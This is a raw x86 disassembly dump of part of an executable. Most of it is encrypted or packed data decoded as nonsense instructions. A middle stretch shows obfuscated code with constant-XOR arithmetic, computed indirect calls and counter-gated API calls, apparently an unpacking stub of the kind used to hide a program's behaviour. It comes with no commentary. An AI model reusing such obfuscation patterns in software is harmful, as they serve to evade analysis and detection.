  40cd19:	dec    eax
  40cd1a:	and    BYTE PTR [edi],cl
  40cd1c:	mov    esi,0xbf2b4865
  40cd21:	inc    eax
  40cd22:	mov    al,0x45
  40cd24:	(bad)  [eax+0x4cabafb7]
  40cd2a:	pop    esi
  40cd2b:	mov    eax,esi
  40cd2d:	fdivr  QWORD PTR [eax+0x21]
  40cd30:	rcl    dh,1
  40cd32:	adc    ebp,edx
  40cd34:	lahf   
  40cd35:	jle    0x40cd1b
  40cd37:	push   ecx
  40cd38:	sub    BYTE PTR [edx+0x72888555],0xc6
  40cd3f:	cdq    
  40cd40:	clc    
  40cd41:	vcmpss xmm0,xmm6,DWORD PTR [edi-0x17],0xba
  40cd47:	sub    ebx,DWORD PTR [eax-0x53]
  40cd4a:	scas   eax,DWORD PTR es:[edi]
  40cd4b:	stos   BYTE PTR es:[edi],al
  40cd4c:	and    eax,0x4154e467
  40cd51:	mov    al,ds:0xf02af673
  40cd56:	xchg   ebx,eax
  40cd57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd58:	stos   DWORD PTR es:[edi],eax
  40cd59:	ins    BYTE PTR es:[edi],dx
  40cd5a:	or     BYTE PTR [ebx],ah
  40cd5c:	dec    edi
  40cd5d:	(bad)  
  40cd5e:	out    dx,al
  40cd5f:	jl     0x40cdbd
  40cd61:	setp   BYTE PTR [esi]
  40cd64:	push   esp
  40cd65:	mov    edx,0x66d37501
  40cd6a:	cmp    BYTE PTR [ecx+0x1edc416d],0x58
  40cd71:	pop    esi
  40cd72:	push   cs
  40cd73:	push   es
  40cd74:	icebp  
  40cd75:	enter  0x722a,0xea
  40cd79:	adc    al,0x1a
  40cd7b:	fimul  WORD PTR [eax+ebx*8-0x65733610]
  40cd82:	and    BYTE PTR [ecx+0xc],bh
  40cd85:	sti    
  40cd86:	dec    ebp
  40cd87:	dec    ebx
  40cd88:	std    
  40cd89:	adc    al,0xd8
  40cd8b:	jno    0x40ce06
  40cd8d:	sub    ah,BYTE PTR [eax]
  40cd8f:	inc    esi
  40cd90:	mov    ecx,0xadf01678
  40cd95:	add    cl,al
  40cd97:	add    dh,BYTE PTR [esi+eiz*8+0x4e]
  40cd9b:	outs   dx,DWORD PTR ds:[esi]
  40cd9c:	pop    ds
  40cd9d:	pop    edx
  40cd9e:	lds    ebp,FWORD PTR [esi-0x17]
  40cda1:	test   BYTE PTR [edx],cl
  40cda3:	fstp   DWORD PTR [eax-0x687dd2da]
  40cda9:	ins    DWORD PTR es:[edi],dx
  40cdaa:	mov    BYTE PTR [ecx],0xeb
  40cdad:	pop    eax
  40cdae:	add    eax,0xc4bdc963
  40cdb3:	leave  
  40cdb4:	mov    edx,0x924efbd
  40cdb9:	push   0x18
  40cdbb:	shl    BYTE PTR [ecx],cl
  40cdbd:	mov    esi,0x1d02cc01
  40cdc2:	mov    edi,0x17d13546
  40cdc7:	cli    
  40cdc8:	imul   esi,DWORD PTR [edx],0xffffffc8
  40cdcb:	aam    0xd4
  40cdcd:	and    DWORD PTR [ebx-0x7d2ef729],edx
  40cdd3:	dec    ebx
  40cdd4:	add    DWORD PTR [eax+0x375baf84],edi
  40cdda:	pop    edi
  40cddb:	fwait
  40cddc:	mov    bh,0x1e
  40cdde:	psubw  mm6,QWORD PTR [ebp+ebp*1-0x4e]
  40cde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde4:	sub    dh,0xbf
  40cde7:	mov    ds:0x3a10f5e,al
  40cdec:	xchg   ecx,eax
  40cded:	outs   dx,BYTE PTR ds:[esi]
  40cdee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdef:	arpl   WORD PTR [ebp+0x5e043b84],si
  40cdf5:	in     al,dx
  40cdf6:	pop    ds
  40cdf7:	fbld   TBYTE PTR [edx+0x1c]
  40cdfa:	ins    DWORD PTR es:[edi],dx
  40cdfb:	dec    esp
  40cdfc:	jb     0x40ce19
  40cdfe:	xor    al,0x24
  40ce00:	xor    DWORD PTR [ebx+0x7e],eax
  40ce03:	andnps xmm1,XMMWORD PTR [ecx-0x1481b182]
  40ce0a:	push   0x8
  40ce0c:	call   0xe3b8162b
  40ce11:	leave  
  40ce12:	data16 jnp 0x40ce38
  40ce15:	dec    ebx
  40ce16:	mov    ebx,0xaf9fcaff
  40ce1b:	mov    edx,0x2b66c7c4
  40ce20:	addr16 and eax,0xd1d0eccc
  40ce26:	add    al,al
  40ce28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce29:	sub    ah,ah
  40ce2b:	mov    eax,0x2714e912
  40ce30:	fstp   TBYTE PTR [ecx+eax*8-0x4ea45449]
  40ce37:	jmp    0xfed4e333
  40ce3c:	enter  0x4e0e,0xcb
  40ce40:	pop    esi
  40ce41:	idiv   esp
  40ce43:	and    eax,0x3b3ee339
  40ce48:	enter  0x840f,0x71
  40ce4c:	add    BYTE PTR [eax],al
  40ce4e:	add    BYTE PTR [ebx+0x458bec7d],cl
  40ce54:	or     BYTE PTR [ebx+0x448b1455],cl
  40ce5a:	add    BYTE PTR [ecx+edi*4],0x93
  40ce5e:	or     BYTE PTR [ecx+0x7],dl
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	mov    ecx,0xc2bcb621
  40d116:	shl    DWORD PTR [edx+0x62],1
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x6]
  40d11e:	daa    
  40d11f:	jnp    0x40d0c4
  40d121:	adc    BYTE PTR [ebx+0x56732ea8],ah
  40d127:	cld    
  40d128:	pop    ss
  40d129:	pop    edx
  40d12a:	sti    
  40d12b:	repnz pop edi
  40d12d:	inc    esp
  40d12e:	dec    esi
  40d12f:	retf   
  40d130:	cmp    al,0x6d
  40d132:	sub    al,0xcb
  40d134:	lods   eax,DWORD PTR ds:[esi]
  40d135:	cmp    eax,0xf7790fb2
  40d13a:	ficom  DWORD PTR [edx-0x3d13fd16]
  40d140:	sbb    DWORD PTR [eax],edx
  40d142:	(bad)  
  40d143:	jne    0x40d1a2
  40d145:	sbb    edi,DWORD PTR [ecx-0x368e7d53]
  40d14b:	sbb    DWORD PTR [edx],ebx
  40d14d:	mov    esi,0x39cc7dd9
  40d152:	adc    BYTE PTR [esp+esi*8-0x35],bl
  40d156:	popf   
  40d157:	xchg   BYTE PTR [ebp-0x78],bl
  40d15a:	aas    
  40d15b:	push   ebp
  40d15c:	xor    al,BYTE PTR ss:[ecx]
  40d15f:	(bad)  
  40d160:	(bad)  
  40d161:	jmp    0xd205:0xa7a450d5
  40d168:	in     eax,dx
  40d169:	add    eax,0x726ca2cf
  40d16e:	xchg   edx,eax
  40d16f:	test   BYTE PTR [edi],ch
  40d171:	shl    DWORD PTR [ebx-0x49ce3f9d],0x5e
  40d178:	sar    BYTE PTR [ecx+ebx*4+0x76],0x4a
  40d17d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d17e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d17f:	dec    ebp
  40d180:	push   ss
  40d181:	sbb    ebx,DWORD PTR [esi+0x9]
  40d184:	pop    eax
  40d185:	or     DWORD PTR [edi-0x3bd10ff7],ebx
  40d18b:	xchg   ebp,eax
  40d18c:	sub    bl,bl
  40d18e:	mov    cl,0x6f
  40d190:	or     BYTE PTR [edi+0x5],al
  40d193:	cmc    
  40d194:	inc    edx
  40d195:	push   0xffffffa4
  40d197:	jmp    0x360f:0x9971d425
  40d19e:	mov    eax,ds:0xd462d976
  40d1a3:	lods   al,BYTE PTR ds:[esi]
  40d1a4:	cmp    DWORD PTR [esi+0x20],ebx
  40d1a7:	or     eax,ebp
  40d1a9:	pop    ebp
  40d1aa:	sbb    BYTE PTR [ecx],ah
  40d1ac:	cli    
  40d1ad:	sbb    bh,BYTE PTR [eax-0xf04a480]
  40d1b3:	mov    ds:0xbe96cece,al
  40d1b8:	sbb    cl,BYTE PTR [ebx+0x99651e7]
  40d1be:	and    DWORD PTR [edx+0x5740f6c3],ebx
  40d1c4:	sbb    ah,BYTE PTR [ebp-0x26]
  40d1c7:	inc    esp
  40d1c8:	nop
  40d1c9:	inc    esi
  40d1ca:	sub    BYTE PTR [ecx-0x3b],dl
  40d1cd:	in     al,dx
  40d1ce:	add    esp,DWORD PTR [ebp+0x3b]
  40d1d1:	pusha  
  40d1d2:	sub    BYTE PTR [edx+0x2887fd5a],dl
  40d1d8:	xor    al,0xa7
  40d1da:	xor    eax,0x75af44cc
  40d1df:	fsub   st(6),st
  40d1e1:	sub    eax,0x2b27970e
  40d1e6:	pop    ds
  40d1e7:	pushf  
  40d1e8:	out    0x3e,eax
  40d1ea:	dec    esp
  40d1eb:	not    ch
  40d1ed:	inc    esi
  40d1ee:	iret   
  40d1ef:	mov    al,ds:0xb1da0d53
  40d1f4:	sbb    eax,DWORD PTR [eax-0x31f5a672]
  40d1fa:	dec    edx
  40d1fb:	xchg   ecx,eax
  40d1fc:	push   edx
  40d1fd:	push   cs
  40d1fe:	ror    BYTE PTR [eax+0x51],0x20
  40d202:	adc    ecx,esp
  40d204:	sub    edx,DWORD PTR [edx+0x55]
  40d207:	inc    ebp
  40d208:	or     al,0xbd
  40d20a:	ret    
  40d20b:	inc    ebp
  40d20c:	pop    esi
  40d20d:	xchg   ebx,eax
  40d20e:	loop   0x40d23d
  40d210:	fwait
  40d211:	test   al,0x2a
  40d213:	fimul  WORD PTR [ebx+0x1a]
  40d216:	adc    al,0xd8
  40d218:	jmp    FWORD PTR ds:0xf672cff9
  40d21e:	iret   
  40d21f:	aad    0x76
  40d221:	xor    dl,bl
  40d223:	pop    eax
  40d224:	dec    esi
  40d225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d226:	push   esi
  40d227:	icebp  
  40d228:	test   eax,0xe8dd64bf
  40d22d:	jae    0x40d1c2
  40d22f:	out    dx,al
  40d230:	cmc    
  40d231:	shr    DWORD PTR [eax+0x5fa33219],0x29
  40d238:	retf   
  40d239:	cmp    esp,DWORD PTR ds:0x8be04636
  40d23f:	dec    esi
  40d240:	lea    esp,[edx+0x22]
  40d243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d244:	adc    bl,BYTE PTR [eax-0x1b]
  40d247:	aas    
  40d248:	adc    al,0xc2
  40d24a:	inc    DWORD PTR [ebx]
  40d24c:	xchg   edi,eax
  40d24d:	sub    al,0x42
  40d24f:	xor    ch,dh
  40d251:	dec    ebx
  40d252:	xchg   edx,eax
  40d253:	or     edx,DWORD PTR ds:0x7860d108
  40d259:	jno    0x40d261
  40d25b:	push   cs
  40d25c:	aas    
  40d25d:	cmc    
  40d25e:	jne    0x40d26e
  40d260:	push   edx
  40d261:	add    DWORD PTR [ecx+ecx*2-0x60],ecx
  40d265:	pop    ebp
  40d266:	bt     DWORD PTR [ebp+0x3c830faa],eax
  40d26d:	dec    edi
  40d26e:	xor    BYTE PTR [ebp+0xca01e79],cl
  40d274:	test   al,0x8
  40d276:	sub    esi,DWORD PTR [ecx+0x37]
  40d279:	mov    eax,fs:0x64edfd14
  40d27f:	enter  0xad39,0xe1
  40d283:	xor    ch,BYTE PTR [eax+0x16]
  40d286:	sbb    eax,0x8e677fba
  40d28b:	jae    0x40d25a
  40d28d:	loop   0x40d23e
  40d28f:	cmp    eax,0xb6b2b58
  40d294:	dec    eax
  40d295:	or     bh,dh
  40d297:	or     eax,0x4ddd1585
  40d29c:	retf   
  40d29d:	hlt    
  40d29e:	ror    BYTE PTR [esi+0x8],1
  40d2a1:	fwait
  40d2a2:	ret    
  40d2a3:	pop    edi
  40d2a4:	popa   
  40d2a5:	imul   BYTE PTR [ecx+0x37]
  40d2a8:	and    al,0x68
  40d2aa:	lods   eax,DWORD PTR ds:[esi]
  40d2ab:	push   ds
  40d2ac:	mov    esp,esp
  40d2ae:	test   edx,ebx
  40d2b0:	mov    ebx,edx
  40d2b2:	push   edi
  40d2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b4:	mov    al,ch
  40d2b6:	out    0xe6,eax
  40d2b8:	pop    ss
  40d2b9:	add    DWORD PTR [edx],0xfffffff1
  40d2bc:	xlat   BYTE PTR ds:[ebx]
  40d2bd:	inc    edx
  40d2be:	ss or  cl,ah
  40d2c1:	inc    edx
  40d2c2:	inc    ecx
  40d2c3:	xor    cl,bl
  40d2c5:	inc    esp
  40d2c6:	dec    ebp
  40d2c7:	mov    ebx,0xa054121
  40d2cc:	or     DWORD PTR [edx+ebp*8-0x3b06b324],esp
  40d2d3:	adc    DWORD PTR [edx+ebp*2-0x2a59ec8c],edx
  40d2da:	xor    dl,al
  40d2dc:	leave  
  40d2dd:	push   ss
  40d2de:	ficomp DWORD PTR [edx]
  40d2e0:	loop   0x40d345
  40d2e2:	jmp    0xf163:0xe6909afb
  40d2e9:	shr    DWORD PTR ds:0x93d54c77,0xaa
  40d2f0:	hlt    
  40d2f1:	pop    eax
  40d2f2:	push   edi
  40d2f3:	(bad)  
  40d2f4:	push   esp
  40d2f5:	mov    ebx,0x73bb76a2
  40d2fa:	stos   DWORD PTR es:[edi],eax
  40d2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2fc:	jb     0x40d28f
  40d2fe:	sub    DWORD PTR [eax-0x200afacd],eax
  40d304:	mov    ebp,edi
  40d306:	repnz int 0x43
  40d309:	cmp    BYTE PTR [edi+0x181d93ea],cl
  40d30f:	pop    esi
  40d310:	adc    DWORD PTR [edx+0x3e7b4eb5],eax
  40d316:	mov    cl,0x8a
  40d318:	jnp    0x40d381
  40d31a:	cmp    eax,DWORD PTR [ebx-0xd8a5c3a]
  40d320:	(bad)  
  40d321:	js     0x40d2d9
  40d323:	cmovnp edx,DWORD PTR [ecx]
  40d326:	adc    ebp,esp
  40d328:	(bad)  [eax+eiz*1-0x2720ca38]
  40d32f:	add    edx,ebx
  40d331:	push   esp
  40d332:	ins    DWORD PTR es:[edi],dx
  40d333:	sbb    dh,cl
  40d335:	push   ss
  40d336:	cs in  al,0x71
  40d339:	add    DWORD PTR [ebx-0x53aa7f95],0xa200e248
  40d343:	sbb    eax,0xbbdf003b
  40d348:	push   edi
  40d349:	leave  
  40d34a:	or     BYTE PTR [edx],ah
  40d34c:	xor    al,0x2e
  40d34e:	in     al,0xa5
  40d350:	(bad)  
  40d351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d352:	lock xchg ebx,eax
  40d354:	mov    ah,0xc1
  40d356:	sysenter 
  40d358:	mov    ecx,0xf0e6bd6b
  40d35d:	call   0x24b6:0xb0a32eee
  40d364:	sahf   
  40d365:	pop    es
  40d366:	rcl    BYTE PTR [ebp-0x30f9466],1
  40d36c:	nop    DWORD PTR [ecx-0x64]
  40d370:	js     0x40d381
  40d372:	jge    0x40d3c6
  40d374:	mov    ch,0xa3
  40d376:	xor    DWORD PTR [edi-0x3c],ebp
  40d379:	jmp    0x52a370f9
  40d37e:	cmp    BYTE PTR [ebx],dh
  40d380:	or     al,BYTE PTR [ecx-0x79]
  40d383:	mov    al,0x89
  40d385:	cdq    
  40d386:	lahf   
  40d387:	adc    BYTE PTR [eax],cl
  40d389:	popf   
  40d38a:	ds fild DWORD PTR es:[eax]
  40d38e:	inc    ebp
  40d38f:	or     BYTE PTR [eax],al
  40d391:	xchg   edi,eax
  40d392:	test   DWORD PTR [edi+edi*1-0x57],edi
  40d396:	out    0xc3,eax
  40d398:	adc    al,0xa6
  40d39a:	test   eax,0x91c4cf30
  40d39f:	imul   esi,edi,0x47deee2d
  40d3a5:	ffreep st(7)
  40d3a7:	nop
  40d3a8:	mov    eax,ds:0x4789dcc6
  40d3ad:	call   FWORD PTR [eax+0x6b]
  40d3b0:	ret    0x8a09
  40d3b3:	stc    
  40d3b4:	ja     0x40d375
  40d3b6:	add    eax,esp
  40d3b8:	inc    esp
  40d3b9:	or     ebp,DWORD PTR [eax-0x3]
  40d3bc:	xor    eax,esp
  40d3be:	and    al,0xda
  40d3c0:	sbb    esp,ebx
  40d3c2:	sub    DWORD PTR [edi+0x39906534],edi
  40d3c8:	mov    eax,0x89723ece
  40d3cd:	xlat   BYTE PTR ds:[ebx]
  40d3ce:	pop    es
  40d3cf:	push   ecx
  40d3d0:	mov    al,ds:0xe7375ce2
  40d3d5:	jne    0x40d42c
  40d3d7:	inc    esi
  40d3d8:	mov    ebp,0x4fe715a4
  40d3dd:	mov    eax,0x61d53bd6
  40d3e2:	push   ds
  40d3e3:	mov    al,0xb
  40d3e5:	inc    esp
  40d3e6:	sbb    BYTE PTR [ebx+0x25],al
  40d3e9:	pop    eax
  40d3ea:	inc    esi
  40d3eb:	mov    bh,cl
  40d3ed:	pop    edi
  40d3ee:	sub    ebp,DWORD PTR [eax]
  40d3f0:	add    dh,al
  40d3f2:	jmp    0x40d3e3
  40d3f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f5:	call   0xad49:0x97b464af
  40d3fc:	and    DWORD PTR [edi],ebp
  40d3fe:	repnz hlt 
  40d400:	xchg   ebp,eax
  40d401:	test   DWORD PTR ds:0x7700cbc9,esi
  40d407:	shr    DWORD PTR [ebx-0x2b092472],0xfd
  40d40e:	mov    WORD PTR [edx-0x25f6a600],?
  40d414:	jl     0x40d491
  40d416:	sub    BYTE PTR [ebx+0x31c340ea],al
  40d41c:	push   ss
  40d41d:	mov    ch,BYTE PTR [edx]
  40d41f:	xchg   eax,ebx
  40d421:	sbb    BYTE PTR [edi],0xa9
  40d424:	out    dx,al
  40d425:	shr    BYTE PTR [eax],cl
  40d427:	gs dec ecx
  40d429:	pop    esp
  40d42a:	pop    eax
  40d42b:	dec    ebp
  40d42c:	jecxz  0x40d3c7
  40d42e:	dec    edi
  40d42f:	lds    esi,FWORD PTR [ecx+0x5eda0882]
  40d435:	cwde   
  40d436:	sub    eax,DWORD PTR [ebx]
  40d438:	sbb    bl,BYTE PTR [ebp-0x4ca11d1]
  40d43e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d43f:	mov    al,cs:0x771aea60
  40d445:	jge    0x40d3db
  40d447:	mov    ds:0x7d436204,al
  40d44c:	push   esp
  40d44d:	or     BYTE PTR [edx-0x731c4e66],bl
  40d453:	(bad)  
  40d454:	jb     0x40d447
  40d456:	cmp    BYTE PTR [edi-0x19a6e17b],ch
  40d45c:	mov    cl,0x9b
  40d45e:	pop    esi
  40d45f:	cld    
  40d460:	in     al,dx
  40d461:	sbb    al,0xb
  40d463:	retf   
  40d464:	xchg   ebx,eax
  40d465:	jb     0x40d3fa
  40d467:	jecxz  0x40d414
  40d469:	jnp    0x40d40a
  40d46b:	push   es
  40d46c:	xchg   DWORD PTR [edx+0x41809b91],eax
  40d472:	xchg   ebp,eax
  40d473:	sbb    BYTE PTR [ecx],cl
  40d475:	push   esi
  40d476:	push   esi
  40d477:	aam    0xbe
  40d479:	sbb    edi,DWORD PTR [ecx+0x1a0e72c5]
  40d47f:	outs   dx,DWORD PTR ds:[esi]
  40d480:	iret   
  40d481:	inc    esp
  40d482:	pop    edi
  40d483:	push   ebp
  40d484:	repnz add BYTE PTR [eax+0x8],0x2e
  40d489:	dec    ebp
  40d48a:	les    eax,FWORD PTR [edx-0x123e87ed]
  40d490:	mov    cl,0x93
  40d492:	(bad)  
  40d493:	mov    bh,0xe9
  40d495:	clc    
  40d496:	xor    dl,al
  40d498:	sar    al,cl
  40d49a:	imul   esi,esp,0x221beb62
  40d4a0:	arpl   WORD PTR [edi],bp
  40d4a2:	jnp    0x40d4d5
  40d4a4:	xchg   ebx,eax
  40d4a5:	nop
  40d4a6:	popa   
  40d4a7:	jle    0x40d510
  40d4a9:	cmp    BYTE PTR [edx-0x5b698aa8],al
  40d4af:	jg     0x40d45d
  40d4b1:	leave  
  40d4b2:	push   ecx
  40d4b3:	inc    ebp
  40d4b4:	pop    ss
  40d4b5:	leave  
  40d4b6:	fs jae 0x40d4ce
  40d4b9:	push   ecx
  40d4ba:	push   ecx
  40d4bb:	dec    ebp
  40d4bc:	jb     0x40d45e
  40d4be:	dec    ebp
  40d4bf:	pop    esi
  40d4c0:	fwait
  40d4c1:	or     BYTE PTR [esp+ebx*4+0x12],dh
  40d4c5:	ds rcl DWORD PTR cs:[esi+0x52c7945f],0x98
  40d4ce:	loopne 0x40d507
  40d4d0:	and    BYTE PTR [eax+0x30],al
  40d4d3:	out    dx,eax
  40d4d4:	inc    edx
  40d4d5:	sbb    DWORD PTR [ebp+0x24],eax
  40d4d8:	sub    esi,esp
  40d4da:	mov    edi,0xfffb9e8b
  40d4df:	call   0xabc9:0x76820867
  40d4e6:	scas   al,BYTE PTR es:[edi]
  40d4e7:	inc    eax
  40d4e8:	xchg   edx,eax
  40d4e9:	sbb    dh,dl
  40d4eb:	xor    esp,DWORD PTR [esi+ebp*2]
  40d4ee:	xor    BYTE PTR ds:0x82966fe,bl
  40d4f4:	ja     0x40d554
  40d4f6:	or     ecx,DWORD PTR [ebp+0x2d]
  40d4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4fa:	icebp  
  40d4fb:	rol    DWORD PTR [esi-0x5dccff36],1
  40d501:	xchg   edx,eax
  40d502:	xor    DWORD PTR [edx+0x1c],edi
  40d505:	inc    edi
  40d506:	retf   0x1ee4
  40d509:	mov    ecx,0x323d9bec
  40d50e:	mov    ch,0x33
  40d510:	retf   
  40d511:	fisubr DWORD PTR [ebx+0x11]
  40d514:	mov    ?,WORD PTR [edi+0x2f]
  40d517:	adc    BYTE PTR [ecx+0x59f9065a],al
  40d51d:	mov    bh,0xf9
  40d51f:	inc    eax
